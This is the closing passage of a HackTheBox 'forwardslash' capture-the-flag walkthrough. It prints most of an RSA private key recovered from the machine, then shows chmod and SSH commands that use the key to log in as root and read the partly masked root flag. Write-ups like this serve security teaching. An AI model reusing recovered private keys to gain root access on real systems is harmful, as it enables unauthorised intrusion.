V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg
G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO
3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC
vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p
MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD
Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn
5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs
V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg
e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8
6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh
i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq
tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW
woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi
/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA
1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW
J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr
OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw
ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
-----END RSA PRIVATE KEY-----
```

That gave me an SSH key.  Since neither `pain` nor `chiv` needed an RSA key to log in via SSH, I figured this had to be `root`'s private key.

### Root.txt

Attempting to log in with the key threw an error I'd seen before.

```text
kac0@kalimaa:~/htb/forwardslash$ ssh -i root.id_rsa root@<YOUR_IP>
load pubkey "root.id_rsa": invalid format
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'root.id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "root.id_rsa": bad permissions
root@<YOUR_IP>'s password: 
```

This confirmed my hunch that it was root's key.  _As always, remember to `chmod 600 <file>` your SSH private keys before using them!_

```text
kac0@kalimaa:~/htb/forwardslash$ chmod 600 root.id_rsa 

kac0@kalimaa:~/htb/forwardslash$ ssh -i root.id_rsa root@<YOUR_IP>
load pubkey "root.id_rsa": invalid format
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
root@forwardslash:~# cat root.txt 
a6a9************************2287
```
